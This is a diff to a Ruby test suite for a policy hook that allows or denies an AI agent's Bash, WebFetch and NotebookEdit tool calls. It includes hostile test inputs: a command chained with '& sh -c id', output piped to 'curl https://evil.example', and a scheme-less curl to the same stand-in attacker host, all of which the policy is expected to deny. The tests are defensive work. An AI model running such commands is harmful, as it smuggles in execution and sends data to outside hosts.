@@ -84,6 +84,9 @@ class WorkflowPackageRuntimePolicyTest < Minitest::Test
       allowed = run_hook(policy, "Bash", { "command" => "git status && git diff --stat" })
       assert_equal "allow", allowed.dig("hookSpecificOutput", "permissionDecision")
 
+      denied = run_hook(policy, "Bash", { "command" => "git diff --stat & sh -c id" })
+      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
+
       denied = run_hook(policy, "Bash", { "command" => "git status | curl https://evil.example" })
       assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
 
@@ -97,6 +100,8 @@ class WorkflowPackageRuntimePolicyTest < Minitest::Test
       allowed = run_hook(policy, "Bash", { "command" => "curl https://api.example.com/data" })
       assert_equal "allow", allowed.dig("hookSpecificOutput", "permissionDecision")
       denied = run_hook(policy, "Bash", { "command" => "curl https://evil.example/data" })
+      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
+      denied = run_hook(policy, "Bash", { "command" => "curl evil.example/data" })
       assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
 
       outside = File.join(dir, "outside")
@@ -148,6 +153,33 @@ class WorkflowPackageRuntimePolicyTest < Minitest::Test
 
       denied = run_hook(policy, "WebFetch", { "url" => "https://[" })
       assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
+    end
+  end
+
+  def test_notebook_edit_uses_its_real_path_field_and_fails_closed
+    with_tmp_dir do |dir|
+      task = File.join(dir, "task")
+      outside = File.join(dir, "outside.ipynb")
+      FileUtils.mkdir_p(task)
+      policy = {
+        "allowed_tools" => [ "NotebookEdit" ],
+        "directories" => [ File.realpath(task) ],
+        "commands" => [], "domains" => [], "executables" => {}
+      }
+
+      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
+        policy, "tool_name" => "NotebookEdit", "tool_input" => { "notebook_path" => outside }
+      )
+      assert_equal "deny", decision
+      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
+        policy, "tool_name" => "NotebookEdit", "tool_input" => {}
+      )
+      assert_equal "deny", decision
+      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
+        policy, "tool_name" => "NotebookEdit",
+        "tool_input" => { "notebook_path" => File.join(task, "analysis.ipynb") }
+      )
+      assert_equal "allow", decision
     end
   end
 
@@ -225,6 +257,7 @@ class WorkflowPackageRuntimePolicyTest < Minitest::Test
     invalid = [
       permissions.merge("tools" => [ "Read" ], "commands" => [ "git status" ]),
       permissions.merge("commands" => [ "git status |" ]),
+      permissions.merge("commands" => [ "git status &" ]),
       permissions.merge("commands" => [ "git st*" ]),
       permissions.merge("commands" => [ "git '" ]),
       permissions.merge("credentials" => [ "token" ]),
